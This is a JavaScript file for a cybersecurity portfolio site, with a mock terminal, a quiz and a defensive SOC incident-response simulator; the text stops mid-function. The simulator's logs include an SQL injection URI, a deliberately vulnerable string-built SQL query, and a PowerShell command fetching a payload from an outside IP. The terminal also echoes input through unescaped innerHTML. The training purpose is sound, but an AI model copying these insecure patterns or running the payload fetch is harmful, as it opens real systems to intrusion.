// Dynamic Interactivity & Logic for Febin Sani's Portfolio v4.0
// Features: 100-Question Quiz Pool, 3-Scenario SOC Simulator w/ Live Log Ticker,
//           Theme Switcher, Sound Synthesis, Audit Reports, Real-Time Threat Intel Feed

document.addEventListener('DOMContentLoaded', () => {

  // ─── SOUND SYNTHESIZER (Web Audio API) ──────────────────────────────────────
  let isMuted = true;
  let audioCtx = null;

  const initAudio = () => {
    if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
    if (audioCtx.state === 'suspended') audioCtx.resume();
  };

  const playSound = (type) => {
    if (isMuted) return;
    try {
      initAudio();
      const osc = audioCtx.createOscillator();
      const gain = audioCtx.createGain();
      osc.connect(gain);
      gain.connect(audioCtx.destination);
      const now = audioCtx.currentTime;

      if (type === 'click') {
        osc.type = 'sine';
        osc.frequency.setValueAtTime(900, now);
        osc.frequency.exponentialRampToValueAtTime(350, now + 0.06);
        gain.gain.setValueAtTime(0.02, now);
        gain.gain.exponentialRampToValueAtTime(0.001, now + 0.06);
        osc.start(now); osc.stop(now + 0.06);
      } else if (type === 'type') {
        osc.type = 'triangle';
        osc.frequency.setValueAtTime(600 + Math.random() * 400, now);
        gain.gain.setValueAtTime(0.01, now);
        gain.gain.exponentialRampToValueAtTime(0.001, now + 0.04);
        osc.start(now); osc.stop(now + 0.04);
      } else if (type === 'success') {
        osc.type = 'sine';
        [523.25, 659.25, 783.99].forEach((f, i) => osc.frequency.setValueAtTime(f, now + i * 0.08));
        gain.gain.setValueAtTime(0.04, now);
        gain.gain.exponentialRampToValueAtTime(0.001, now + 0.35);
        osc.start(now); osc.stop(now + 0.35);
      } else if (type === 'error') {
        osc.type = 'sawtooth';
        osc.frequency.setValueAtTime(160, now);
        osc.frequency.linearRampToValueAtTime(100, now + 0.18);
        gain.gain.setValueAtTime(0.05, now);
        gain.gain.exponentialRampToValueAtTime(0.001, now + 0.2);
        osc.start(now); osc.stop(now + 0.2);
      } else if (type === 'alarm') {
        osc.type = 'sine';
        osc.frequency.setValueAtTime(660, now);
        osc.frequency.linearRampToValueAtTime(440, now + 0.12);
        gain.gain.setValueAtTime(0.025, now);
        gain.gain.exponentialRampToValueAtTime(0.001, now + 0.15);
        osc.start(now); osc.stop(now + 0.15);
      }
    } catch (e) { /* silent fail */ }
  };

  const soundToggle = document.getElementById('sound-toggle');
  if (soundToggle) {
    soundToggle.addEventListener('click', () => {
      isMuted = !isMuted;
      if (!isMuted) {
        initAudio();
        soundToggle.textContent = '🔊 SOUND ON';
        soundToggle.classList.add('glow-text');
        playSound('success');
      } else {
        soundToggle.textContent = '🔇 MUTED';
        soundToggle.classList.remove('glow-text');
      }
    });
  }

  // ─── THEME ACCENT SWITCHER ───────────────────────────────────────────────────
  const themeDots = document.querySelectorAll('.theme-picker .theme-dot');
  themeDots.forEach(dot => {
    dot.addEventListener('click', (e) => {
      playSound('click');
      const themeClass = e.target.getAttribute('data-theme');
      themeDots.forEach(d => d.classList.remove('active'));
      e.target.classList.add('active');
      document.body.className = themeClass;
    });
  });

  // ─── FLOATING CANVAS NETWORK ─────────────────────────────────────────────────
  const canvas = document.getElementById('network-canvas');
  if (canvas) {
    const ctx = canvas.getContext('2d');
    let particles = [];
    const mouse = { x: null, y: null, radius: 120 };

    const resizeCanvas = () => {
      canvas.width = window.innerWidth;
      canvas.height = window.innerHeight;
      initParticles();
    };

    class Particle {
      constructor() {
        this.x = Math.random() * canvas.width;
        this.y = Math.random() * canvas.height;
        this.vx = (Math.random() - 0.5) * 0.3;
        this.vy = (Math.random() - 0.5) * 0.3;
        this.size = Math.random() * 1.5 + 0.8;
      }
      update() {
        this.x += this.vx; this.y += this.vy;
        if (this.x < 0 || this.x > canvas.width) this.vx *= -1;
        if (this.y < 0 || this.y > canvas.height) this.vy *= -1;
        if (mouse.x !== null) {
          const dx = this.x - mouse.x, dy = this.y - mouse.y;
          const dist = Math.sqrt(dx * dx + dy * dy);
          if (dist < mouse.radius) {
            const force = (mouse.radius - dist) / mouse.radius;
            this.x += (dx / dist) * force * 0.5;
            this.y += (dy / dist) * force * 0.5;
          }
        }
      }
      draw() {
        const accent = getComputedStyle(document.body).getPropertyValue('--accent').trim();
        ctx.beginPath();
        ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
        ctx.fillStyle = accent + '55';
        ctx.fill();
      }
    }

    const initParticles = () => {
      particles = [];
      const cap = Math.min(Math.floor((canvas.width * canvas.height) / 14000), 80);
      for (let i = 0; i < cap; i++) particles.push(new Particle());
    };

    const animateParticles = () => {
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      particles.forEach(p => { p.update(); p.draw(); });
      for (let i = 0; i < particles.length; i++) {
        for (let j = i + 1; j < particles.length; j++) {
          const dx = particles[i].x - particles[j].x;
          const dy = particles[i].y - particles[j].y;
          const dist = Math.sqrt(dx * dx + dy * dy);
          if (dist < 90) {
            const alpha = Math.floor(((90 - dist) / 90) * 0.09 * 255).toString(16).padStart(2, '0');
            const secondary = getComputedStyle(document.body).getPropertyValue('--accent-secondary').trim();
            ctx.beginPath();
            ctx.moveTo(particles[i].x, particles[i].y);
            ctx.lineTo(particles[j].x, particles[j].y);
            ctx.strokeStyle = secondary + alpha;
            ctx.lineWidth = 0.6;
            ctx.stroke();
          }
        }
      }
      requestAnimationFrame(animateParticles);
    };

    window.addEventListener('resize', resizeCanvas);
    window.addEventListener('mousemove', e => { mouse.x = e.clientX; mouse.y = e.clientY; });
    window.addEventListener('mouseout', () => { mouse.x = null; mouse.y = null; });
    resizeCanvas();
    animateParticles();
  }

  // ─── MOBILE NAV ───────────────────────────────────────────────────────────────
  const menuBtn = document.getElementById('nav-menu-btn');
  const navLinks = document.getElementById('nav-links');
  if (menuBtn && navLinks) {
    menuBtn.addEventListener('click', () => {
      playSound('click');
      navLinks.classList.toggle('active');
      menuBtn.innerHTML = navLinks.classList.contains('active') ? '✕' : '☰';
    });
    navLinks.querySelectorAll('a').forEach(link => {
      link.addEventListener('click', () => {
        navLinks.classList.remove('active');
        menuBtn.innerHTML = '☰';
      });
    });
  }

  // ─── CLI TERMINAL (REAL TECHNICAL WORK SAMPLES) ───────────────────────────────
  const terminal = document.getElementById('terminal-body');
  const termInput = document.getElementById('terminal-input');
  const termOutput = document.getElementById('terminal-output');

  if (terminal && termInput && termOutput) {
    ['SOC Triage Console Node v1.2.0 initialized.', 'Access Level: RECRUITER_AUDIT_MODE',
     "Type 'help' to review available scripts and log rules.", ''].forEach(line => {
      const div = document.createElement('div');
      div.className = 'terminal-line';
      div.textContent = line;
      termOutput.appendChild(div);
    });

    terminal.addEventListener('click', () => termInput.focus());
    termInput.addEventListener('keydown', e => {
      if (e.key === 'Enter') {
        const cmd = termInput.value.trim();
        termInput.value = '';
        if (cmd) executeCommand(cmd);
      } else if (e.key.length === 1) {
        playSound('type');
      }
    });

    const printLine = (text, color = '') => {
      const div = document.createElement('div');
      div.className = 'terminal-line';
      div.style.whiteSpace = 'pre-wrap';
      div.textContent = text;
      if (color) div.style.color = color;
      termOutput.appendChild(div);
      terminal.scrollTop = terminal.scrollHeight;
    };

    const executeCommand = (cmdStr) => {
      playSound('click');
      const mainCmd = cmdStr.split(' ')[0].toLowerCase();
      const promptDiv = document.createElement('div');
      promptDiv.className = 'terminal-line';
      promptDiv.innerHTML = `<span class="terminal-prompt-sym">$</span> <span style="color:var(--accent)">${cmdStr}</span>`;
      termOutput.appendChild(promptDiv);

      switch (mainCmd) {
        case 'help':
          printLine([
            'AVAILABLE SYSTEM AUDIT COMMANDS:',
            '  splunk    - Display custom Splunk alert search query',
            '  wazuh     - View Wazuh threat detection XML rule',
            '  script    - View Python log-parsing automation script',
            '  thm       - Print TryHackMe sandbox metrics & rankings',
            '  about     - Display biography and career outline',
            '  clear     - Wipe console logs'
          ].join('\n'));
          break;
        case 'splunk':
          printLine([
            '--- CUSTOM SPLUNK AUTH CORRELATION QUERY ---',
            'index=security sourcetype=linux_secure',
            '| stats count values(user) as tried dc(user) as unique BY src_ip',
            '| where count > 15 AND unique > 3',
            '| eval level=if(count > 50,"CRITICAL","HIGH")',
            '| sort - count',
            '',
            '// Detects distributed SSH credential spraying from source IPs.'
          ].join('\n'));
          break;
        case 'wazuh':
          printLine([
            '<!-- CUSTOM WAZUH INTEGRATION RULE -->',
            '<group name="linux,syslog,authentication_failed,">',
            '  <rule id="100085" level="10">',
            '    <if_sid>5716</if_sid>',
            '    <srcip>198.51.100.42</srcip>',
            '    <description>SSH brute force: Blocklist IP match (MITRE T1110)</description>',
            '  </rule>',
            '</group>',
            '',
            '// Fires when known malicious IP matches SSH failure events.'
          ].join('\n'));
          break;
        case 'script':
          printLine([
            '# python3 auth_log_parser.py',
            'import re',
            '',
            "def parse_ssh_failures(log):",
            "    rx = r'Failed password for (?:invalid user )?(\\S+) from (\\S+)'",
            "    for line in open(log):",
            '        m = re.search(rx, line)',
            '        if m: print(f"[ALERT] User:{m[1]} From:{m[2]}")',
            '',
            "parse_ssh_failures('/var/log/auth.log')",
            '',
            '// Extracts failed SSH logins and prints suspicious IPs.'
          ].join('\n'));
          break;
        case 'thm':
          printLine([
            '--- TRYHACKME PROFILE ---',
            '  Username:     NDFS',
            '  Global Rank:  Top 200',
            '  India Rank:   Top 20',
            '  Solved Rooms: 1050+',
            '  Pathways:',
            '    ✔ SOC Level 1 & 2',
            '    ✔ Cyber Defense',
            '    ✔ Offensive Pentesting'
          ].join('\n'));
          break;
        case 'about':
          printLine([
            'Transitioned from Civil Engineering (2019) to Cybersecurity.',
            'Earned ADCD (2024), pursuing BCA. Ranked Top 20 India on TryHackMe.',
            'Currently: Researcher & Trainer at RedTeam Hacker Academy.'
          ].join('\n'));
          break;
        case 'clear':
          termOutput.innerHTML = '';
          terminal.scrollTop = 0;
          return;
        default:
          printLine(`Command not recognized: '${mainCmd}'. Type 'help'.`);
          playSound('error');
      }
      terminal.scrollTop = terminal.scrollHeight;
    };
  }

  // ─── SECURITY+ QUIZ (100 QUESTION POOL) ─────────────────────────────────────
  const quizQ = document.getElementById('quiz-question-text');
  const quizOpts = document.getElementById('quiz-options-container');
  const quizFB = document.getElementById('quiz-feedback');
  const quizScore = document.getElementById('quiz-score');
  const quizQNum = document.getElementById('quiz-q-num');
  const quizTopic = document.getElementById('quiz-topic');

  if (quizQ && quizOpts && typeof SECURITY_PLUS_QUESTIONS !== 'undefined') {
    // Shuffle the 100 questions for each session
    const shuffle = arr => [...arr].sort(() => Math.random() - 0.5);
    const pool = shuffle(SECURITY_PLUS_QUESTIONS);

    let qIdx = 0, score = 0, locked = false;

    const loadQ = (idx) => {
      locked = false;
      quizFB.textContent = '';
      quizFB.style.color = '';
      const q = pool[idx];
      quizTopic.textContent = q.topic;
      quizQNum.textContent = idx + 1;
      quizQ.textContent = q.question;
      quizOpts.innerHTML = '';
      q.options.forEach((opt, i) => {
        const btn = document.createElement('button');
        btn.className = 'quiz-option-btn';
        btn.textContent = opt;
        btn.addEventListener('click', () => pick(i));
        quizOpts.appendChild(btn);
      });
    };

    const pick = (optIdx) => {
      if (locked) return;
      locked = true;
      const q = pool[qIdx];
      const btns = quizOpts.querySelectorAll('.quiz-option-btn');
      if (optIdx === q.correct) {
        score++;
        quizScore.textContent = score;
        btns[optIdx].classList.add('correct');
        quizFB.textContent = '[+] ' + q.feedback;
        quizFB.style.color = 'var(--accent-secondary)';
        playSound('success');
      } else {
        btns[optIdx].classList.add('wrong');
        btns[q.correct].classList.add('correct');
        quizFB.textContent = '[-] Incorrect. ' + q.feedback;
        quizFB.style.color = 'var(--red)';
        playSound('error');
      }
      setTimeout(() => {
        qIdx++;
        if (qIdx < pool.length) {
          loadQ(qIdx);
        } else {
          showResults();
        }
      }, 3000);
    };

    const showResults = () => {
      quizQ.textContent = 'Quiz Complete — All 100 Questions Answered!';
      quizOpts.innerHTML = `
        <div style="text-align:center;padding:10px">
          <h4 style="font-family:var(--font-title);font-size:1.1rem;color:#fff;margin-bottom:8px">
            Final Score: ${score}/100
          </h4>
          <p style="font-size:0.82rem;color:var(--text-muted);line-height:1.5">
            ${score >= 75 ? 'Excellent! You are Security+ ready.' : 'Keep practising — you are getting there!'}
          </p>
          <button id="quiz-reset-btn" class="btn btn-primary" style="margin-top:16px;padding:8px 16px;font-size:0.75rem">Restart Quiz</button>
        </div>`;
      quizFB.textContent = '';
      document.getElementById('quiz-reset-btn').addEventListener('click', () => {
        playSound('click');
        qIdx = 0; score = 0;
        quizScore.textContent = '0';
        const newPool = shuffle(SECURITY_PLUS_QUESTIONS);
        pool.length = 0;
        newPool.forEach(q => pool.push(q));
        loadQ(0);
      });
    };

    loadQ(0);
  }

  // ─── SOC SIMULATOR (3 SCENARIOS + LIVE BACKGROUND LOG TICKER) ───────────────
  const simConsoleBody = document.getElementById('sim-console-body');
  const simAlertTitle = document.getElementById('sim-alert-title');
  const simAlertCode = document.getElementById('sim-alert-code');
  const simAlertLogs = document.getElementById('sim-alert-logs');
  const simActionChoices = document.getElementById('sim-action-choices');
  const simFeedback = document.getElementById('sim-feedback');
  const simIndicator = document.getElementById('sim-indicator-light');
  const simStatusTitle = document.getElementById('sim-status-title');
  const simInjectBtn = document.getElementById('sim-inject-btn');
  const simScenarioSelect = document.getElementById('sim-scenario-select');

  if (simConsoleBody && simAlertLogs) {
    let tickerInterval = null;
    let alarmInterval = null;
    let simActive = false;
    let currentStage = 0;
    let currentScenario = '';

    // Normal traffic log lines streamed in background
    const normalLogs = [
      'systemd: Started Session 44 of user admin.',
      'sshd[1042]: Accepted publickey for devops from 10.10.1.5 port 55234',
      'cron[882]: (root) CMD (/usr/lib/update-notifier/apt-check)',
      'kernel: [1234.567890] eth0: renamed from veth3ba2f1a',
      'CRON[1201]: pam_unix(cron:session): session opened for root',
      'systemd[1]: Starting Daily apt upgrade and clean activities...',
      'rsyslogd: -- MARK --',
      'sshd[1129]: Accepted publickey for monitor from 10.10.1.12 port 44812',
      'kernel: NET: Registered PF_INET6 protocol family',
      'mysqld[987]: InnoDB: page_cleaner: 1000ms intended loop took 1034ms',
      'ntpd[732]: kernel time sync enabled 0001',
      'dhclient[538]: bound to 192.168.1.100 -- renewal in 3600 seconds.',
      'ufw: [UFW ALLOW] IN=eth0 OUT= SRC=10.10.1.2 DST=10.10.1.100 DPT=443',
      'nginx[1203]: access.log: 10.10.1.1 GET /api/status 200',
      'filebeat[9912]: log harvest started: /var/log/syslog',
      'wazuh-agent[3304]: Sending keepalive to manager.',
      'systemd: Reached target Network is Online.',
      'kernel: audit: type=1100 audit(1748587200.123:45): arch=c000003e',
      'logrotate[1099]: rotating log /var/log/auth.log',
      'snapd[671]: 2026/05/30 03:42:01 api.go:234: v2 API request: GET /v2/changes'
    ];

    const getTimestamp = () => {
      const now = new Date();
      return `${now.getFullYear()}-${String(now.getMonth()+1).padStart(2,'0')}-${String(now.getDate()).padStart(2,'0')} ${String(now.getHours()).padStart(2,'0')}:${String(now.getMinutes()).padStart(2,'0')}:${String(now.getSeconds()).padStart(2,'0')}`;
    };

    // Start background log ticker
    const startTicker = () => {
      simAlertTitle.textContent = 'MONITORING';
      simAlertCode.textContent = 'NOMINAL';
      simAlertLogs.textContent = `${getTimestamp()} [INFO] Syslog ingest agent connected.\n${getTimestamp()} [INFO] Awaiting events...`;

      tickerInterval = setInterval(() => {
        if (simActive) return; // pause during active alert
        const line = normalLogs[Math.floor(Math.random() * normalLogs.length)];
        const current = simAlertLogs.textContent;
        const lines = current.split('\n');
        if (lines.length > 12) lines.shift();
        lines.push(`${getTimestamp()} [INFO] ${line}`);
        simAlertLogs.textContent = lines.join('\n');
        simAlertLogs.scrollTop = simAlertLogs.scrollHeight;
      }, 2500);
    };

    startTicker();

    // Scenario definitions
    const scenarios = {
      ssh: {
        title: 'CRITICAL: SSH BRUTE FORCE + BACKDOOR',
        code: 'ALRT-SSH-099',
        logs: [
          '09:12:01 [ALERT] Failed password for root from 198.51.100.42 port 49122 ssh2',
          '09:12:03 [ALERT] Failed password for admin from 198.51.100.42 port 49124 ssh2',
          '09:12:05 [ALERT] Failed password for oracle from 198.51.100.42 port 49126 ssh2',
          '09:12:07 [ALERT] Accepted password for root from 198.51.100.42 port 49128 ssh2',
          '09:12:09 [WARN ] Suspicious LDAP enumeration from Host-17'
        ].join('\n'),
        stage1: {
          choices: [
            { key: 'ignore', text: 'A. Archive as false positive — system backup task matches timing.' },
            { key: 'scan',   text: 'B. Run local antivirus scan on Host-17 endpoint.' },
            { key: 'isolate',text: 'C. Isolate Host-17 and block IP 198.51.100.42 at perimeter firewall.' }
          ],
          correct: 'isolate',
          successMsg: '[+] Host-17 isolated. IP blacklisted. Stage 2: Persistence audit unlocked.',
          failMsgs: {
            ignore: '[-] FAIL: Attacker completed lateral movement to Domain Controller!',
            scan: '[-] PARTIAL: AV scan found nothing; interactive shell remains open.'
          }
        },
        stage2: {
          logs: [
            'root@Host-17:~# cat /root/.ssh/authorized_keys',
            'ssh-rsa AAAAB3NzaC1yc2E...attacker@c2-host',
            '# stat /root/.ssh/authorized_keys',
            'Modify: 09:12:08 (1 sec after login — backdoor planted)'
          ].join('\n'),
          choices: [
            { key: 'close',  text: 'A. Terminate active SSH session and disconnect terminal.' },
            { key: 'audit',  text: 'B. Purge rogue key, rotate root password, disable root SSH login in sshd_config.' },
            { key: 'rebuild',text: 'C. Immediately re-image Host-17 from golden template.' }
          ],
          correct: 'audit',
          successMsg: '[+] Persistence vector eliminated. Root access hardened. Incident CLOSED.',
          failMsgs: {
            close: '[-] FAIL: Terminating session leaves backdoor key intact.',
            rebuild: '[-] INCOMPLETE: Re-imaging destroys forensic evidence before root cause is documented.'
          }
        }
      },
      sqli: {
        title: 'CRITICAL: SQL INJECTION — DATA EXFILTRATION',
        code: 'ALRT-SQLI-042',
        logs: [
          "09:18:22 [ALERT] WAF rule 942100 triggered — SQL Injection attempt",
          "09:18:22 [ALERT] URI: /api/user?id=1'+OR+1=1--",
          "09:18:23 [ALERT] DB query returned 14,892 rows in 380ms (anomalous)",
          "09:18:25 [ALERT] Outbound transfer 28MB to 203.0.113.55 via port 443",
          "09:18:26 [WARN ] auth.log: no matching user session for DB query origin"
        ].join('\n'),
        stage1: {
          choices: [
            { key: 'ignore', text: 'A. Mark as automated scanner noise — no user complaints received.' },
            { key: 'block',  text: 'B. Block IP 203.0.113.55 at firewall and enable WAF block mode.' },
            { key: 'patch',  text: 'C. Take /api/user endpoint offline and alert backend dev team.' }
          ],
          correct: 'block',
          successMsg: '[+] Exfiltration channel severed. WAF in block mode. Stage 2: Root cause analysis.',
          failMsgs: {
            ignore: '[-] FAIL: Attacker exfiltrated full user table — 14,892 records exposed!',
            patch: '[-] PARTIAL: Endpoint offline but attacker IP still has active connection.'
          }
        },
        stage2: {
          logs: [
            '// Vulnerable endpoint code (Node.js):',
            "app.get('/api/user', (req,res) => {",
            "  db.query(`SELECT * FROM users WHERE id=${req.query.id}`, ...)",
            '})',
            '',
            '// WAF detected: UNION SELECT payloads in id parameter',
            '// Fix required: Parameterised query / prepared statement'
          ].join('\n'),
          choices: [
            { key: 'waf',   text: 'A. Rely on WAF rules permanently — no code changes needed.' },
            { key: 'fix',   text: 'B. Patch endpoint with parameterised queries, add input validation, rotate DB credentials.' },
            { key: 'delete',text: 'C. Delete the endpoint and redeploy entire application server.' }
          ],
          correct: 'fix',
          successMsg: '[+] Parameterised queries deployed. Credentials rotated. Vulnerability patched. CLOSED.',
          failMsgs: {
            waf: '[-] FAIL: WAF can be bypassed with encoding tricks; root vulnerability unresolved.',
            delete: '[-] INCOMPLETE: Deleting server without patching code means same flaw re-deploys.'
          }
        }
      },
      phish: {
        title: 'CRITICAL: PHISHING — RANSOMWARE DELIVERY',
        code: 'ALRT-RANS-017',
        logs: [
          "09:31:04 [ALERT] Email gateway: attachment 'Invoice_May2026.xlsm' passed AV — macro-enabled",
          "09:31:09 [ALERT] User HR-PC-03 opened attachment — Office macro execution detected",
          "09:31:11 [ALERT] PowerShell spawned: -EncodedCommand <base64 payload>",
          "09:31:13 [ALERT] Outbound HTTP to 185.220.101.47 — known C2 infrastructure",
          "09:31:15 [ALERT] Registry: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run — new entry added"
        ].join('\n'),
        stage1: {
          choices: [
            { key: 'ignore', text: 'A. User probably opened a legitimate invoice — monitor for 24 hours.' },
            { key: 'isolate',text: 'B. Immediately isolate HR-PC-03 from network and block C2 IP at firewall.' },
            { key: 'av',     text: 'C. Push an AV signature update and run a full scan on HR-PC-03.' }
          ],
          correct: 'isolate',
          successMsg: '[+] HR-PC-03 cut from network. C2 beacon blocked. Stage 2: Persistence cleanup.',
          failMsgs: {
            ignore: '[-] FAIL: Ransomware encrypted 3 shared drives within 18 minutes!',
            av: '[-] PARTIAL: AV missed the fileless payload in memory — C2 connection still active.'
          }
        },
        stage2: {
          logs: [
            '// Forensic findings on HR-PC-03:',
            'Registry run key: C:\\Users\\Public\\svchost32.exe (malicious)',
            'PowerShell transcript: Invoke-WebRequest -Uri http://185.220.101.47/payload.ps1',
            'Scheduled task: \\Microsoft\\Windows\\SilentCleanup — modified to call dropper',
            'Macro source: Document_Open() auto-execute VBA',
            'Recommendation: Remove persistence, image machine, patch Office macro policy'
          ].join('\n'),
          choices: [
            { key: 'reboot',  text: 'A. Restart HR-PC-03 and monitor — reboot clears memory threats.' },
            { key: 'remediate',text: 'B. Remove registry key, delete malicious binary, delete scheduled task, reimage, enforce Group Policy to block macros.' },
            { key: 'password',text: 'C. Change the HR user\'s Windows password and reconnect to network.' }
          ],
          correct: 'remediate',
          successMsg: '[+] All persistence vectors removed. Machine reimaged. Macro policy enforced. CLOSED.',
          failMsgs: {
            reboot: '[-] FAIL: Registry run key and scheduled task survive reboot — threat returns.',
            password: '[-] FAIL: Password change does not remove malicious executables or registry entries.'
          }
        }
      }
    };

    let stage = 1;

    const resetSim = () => {
      simActive = false;
      stage = 1;
      simIndicator.className = 'sim-indicator-light';
      simStatusTitle.textContent = 'SIEM TELEMETRY INGEST: OK';
      simAlertTitle.textContent = 'MONITORING';
      simAlertCode.textContent = 'NOMINAL';
      simActionChoices.innerHTML = '';
      simFeedback.textContent = '';
      simFeedback.className = 'sim-feedback';
      if (alarmInterval) { clearInterval(alarmInterval); alarmInterval = null; }
    };

    const injectScenario = (scenarioKey) => {
      resetSim();
      simActive = true;
      currentScenario = scenarioKey;
      const sc = scenarios[scenarioKey];

      simIndicator.className = 'sim-indicator-light alarm';
      simStatusTitle.textContent = 'ALARM TRIGGERED';
      simAlertTitle.textContent = sc.title;
      simAlertCode.textContent = sc.code;
      simAlertLogs.textContent = sc.logs;

      alarmInterval = setInterval(() => playSound('alarm'), 2000);

      renderStage1(sc);
    };

    const renderStage1 = (sc) => {
      stage = 1;
      simActionChoices.innerHTML = '';
      simFeedback.textContent = '';
      simFeedback.className = 'sim-feedback';

      sc.stage1.choices.forEach(c => {
        const btn = document.createElement('button');
        btn.className = 'sim-choice-btn';
        btn.textContent = c.text;
        btn.addEventListener('click', () => handleStage1(c.key, sc));
        simActionChoices.appendChild(btn);
      });
    };

    const handleStage1 = (choice, sc) => {
      if (choice === sc.stage1.correct) {
        playSound('success');
        simFeedback.className = 'sim-feedback success';
        simFeedback.textContent = sc.stage1.successMsg;
        simActionChoices.innerHTML = '';
        setTimeout(() => renderStage2(sc), 2200);
      } else {
        playSound('error');
        simFeedback.className = 'sim-feedback error';
        simFeedback.textContent = sc.stage1.failMsgs[choice] + ' — Re-select your action.';
      }
    };

    const renderStage2 = (sc) => {
      stage = 2;
      simAlertLogs.textContent = sc.stage2.logs;
      simAlertTitle.textContent = 'STAGE 2: ROOT CAUSE ANALYSIS';
      simFeedback.textContent = '';
      simFeedback.className = 'sim-feedback';
      simActionChoices.innerHTML = '';

      sc.stage2.choices.forEach(c => {
        const btn = document.createElement('button');
        btn.className = 'sim-choice-btn';
        btn.textContent = c.text;
        btn.addEventListener('click', () => handleStage2(c.key, sc));
        simActionChoices.appendChild(btn);
      });
    };

    const handleStage2 = (choice, sc) => {
      if (choice === sc.stage2.correct) {
        playSound('success');
        clearInterval(alarmInterval);
        simFeedback.className = 'sim-feedback success';
        simFeedback.textContent = sc.stage2.successMsg;
        simIndicator.className = 'sim-indicator-light';
        simStatusTitle.textContent = 'SIEM TELEMETRY INGEST: OK';
        simActionChoices.innerHTML = '';

        setTimeout(() => {
          simConsoleBody.innerHTML = `
            <div class="sim-success-screen">
              <div class="sim-success-icon">🏆</div>
              <h4 style="font-family:var(--font-title);font-size:1.1rem;color:#fff">INCIDENT CONTAINED</h4>
              <p style="font-size:0.82rem;color:var(--text-muted);max-width:320px;text-align:center;line-height:1.5">
                Both stages resolved correctly. Root cause identified and remediated.
              </p>
              <div style="font-family:var(--font-mono);font-size:0.75rem;background:rgba(0,255,157,0.05);border:1px dashed rgba(0,255,157,0.2);padding:12px;border-radius:4px;width:100%;margin-top:8px">
                <div style="display:flex;justify-content:space-between;margin-bottom:4px"><span>TRIAGE SCORE:</span><span style="color:var(--accent-secondary)">100/100</span></div>
                <div style="display:flex;justify-content:space-between"><span>CLASSIFICATION:</span><span style="color:var(--accent)">SEC-OP-EXPERT</span></div>
              </div>
              <button id="sim-retry-btn" class="btn btn-secondary" style="margin-top:12px;padding:6px 16px;font-size:0.75rem">Run Another Scenario</button>
            </div>`;

          document.getElementById('sim-retry-btn').addEventListener('click', () => {
            playSound('click');
            simConsoleBody.innerHTML = `
              <div class="sim-alert-panel" id="sim-alert-panel">
                <div class="sim-alert-header">
                  <span class="sim-alert-title" id="sim-alert-title">MONITORING</span>
                  <span class="sim-alert-code" id="sim-alert-code">NOMINAL</span>
                </div>
                <div class="sim-alert-logs" id="sim-alert-logs"></div>
              </div>
              <div class="sim-action-choices" id="sim-action-choices"></div>
              <div class="sim-feedback" id="sim-feedback"></div>`;
            // Re-wire references
            setTimeout(() => window.location.reload(), 50);
          });
        }, 2000);
      } else {
        playSound('error');
        simFeedback.className = 'sim-feedback error';
        simFeedback.textContent = sc.stage2.failMsgs[choice] + ' — Try again.';
      }
    };

    // Inject button
    if (simInjectBtn && simScenarioSelect) {
      simInjectBtn.addEventListener('click', () => {
        playSound('click');
        injectScenario(simScenarioSelect.value);
      });
    }
  }

  // ─── SECURITY AUDIT REPORT SLIDE PANEL ───────────────────────────────────────
  const reportPanel = document.getElementById('report-panel');
  const reportOverlay = document.getElementById('report-overlay');
  const reportCloseBtn = document.getElementById('report-close-btn');
  const reportModalTag = document.getElementById('report-modal-tag');
  const reportModalTitle = document.getElementById('report-modal-title');
  const reportModalClass = document.getElementById('report-modal-class');
  const reportModalTarget = document.getElementById('report-modal-target');
  const reportModalBody = document.getElementById('report-modal-body');

  const projectReports = {
    wazuh: {
      tag: 'SECURITY OPERATIONS / SIEM REPORT',
      title: 'Wazuh Log Aggregation Cluster Deployment',
      classification: 'PROPRIETARY DEFENSE DATA',
      target: 'SYS-WAZUH-MONITOR-01',
      body: `
        <h4>1. Executive Summary</h4>
        <p>Documents configuration and integration of a centralized Wazuh SIEM. Handles syslog ingestion, decoder mapping, and alerts indexed to MITRE ATT&CK tactics.</p>
        <h4>2. Sample Correlation Rule</h4>
        <div class="report-code-block">&lt;rule id="100085" level="10"&gt;
  &lt;if_sid&gt;5716&lt;/if_sid&gt;
  &lt;srcip&gt;198.51.100.42&lt;/srcip&gt;
  &lt;description&gt;SSH Brute Force: Blacklist Match (MITRE T1110)&lt;/description&gt;
&lt;/rule&gt;</div>
        <h4>3. Key Metrics</h4>
        <ul><li>False-positive rate reduced by 42% after custom filter tuning.</li>
        <li>Handled 450+ events per second without buffer loss.</li></ul>
        <h4>4. Recommendations</h4>
        <p>Enforce SSH key-only auth, implement fail2ban feeding blocklist back to Wazuh active response API.</p>`
    },
    vm: {
      tag: 'PENTEST LAB DESIGN REPORT',
      title: 'Vulnerable VM Construction & Exploit Sequence',
      classification: 'RESTRICTED SECURITY SYLLABUS',
      target: 'LAB-VULN-TARGET-VM',
      body: `
        <h4>1. Executive Summary</h4>
        <p>Custom Linux VM with deliberate misconfigurations for student privilege escalation practice at RedTeam Hacker Academy.</p>
        <h4>2. Primary Vulnerability</h4>
        <div class="report-code-block"># World-writable cron script
stat /etc/cron.d/sys_backup
Access: (0777/-rwxrwxrwx) Uid: (1002/admin)</div>
        <h4>3. Remediation</h4>
        <div class="report-code-block">chown root:root /etc/cron.d/sys_backup
chmod 644 /etc/cron.d/sys_backup</div>
        <h4>4. Educational Outcomes</h4>
        <p>Students learn SUID/cron misconfiguration exploitation and how to document remediation steps in a professional report format.</p>`
    },
    lab: {
      tag: 'SOC RANGE ARCHITECTURE REPORT',
      title: 'Self-Hosted SOC Lab: Elastic Stack & Suricata IDS',
      classification: 'INTERNAL LAB DATA',
      target: 'TEST-SOC-RANGE-01',
      body: `
        <h4>1. Executive Summary</h4>
        <p>Private research SOC lab with Suricata IDS sending JSON telemetry to Elasticsearch, visualised in Kibana.</p>
        <h4>2. Data Flow</h4>
        <ul><li>Network tap captures raw packets.</li><li>Suricata compiles threat events using Snort signatures.</li>
        <li>Filebeat forwards JSON to Elasticsearch.</li><li>Kibana surfaces alerts for forensic review.</li></ul>
        <h4>3. Sample Kibana Filter</h4>
        <div class="report-code-block">event.dataset: "suricata.eve"
AND suricata.eve.alert.signature: "SQL Injection"</div>
        <h4>4. Next Steps</h4>
        <p>Deploy Elastic Agents on endpoints to enable Sysmon correlation between network and host-level telemetry.</p>`
    }
  };

  const openReport = (key) => {
    const r = projectReports[key];
    if (!r) return;
    playSound('click');
    reportModalTag.textContent = r.tag;
    reportModalTitle.textContent = r.title;
    reportModalClass.textContent = r.classification;
    reportModalTarget.textContent = r.target;
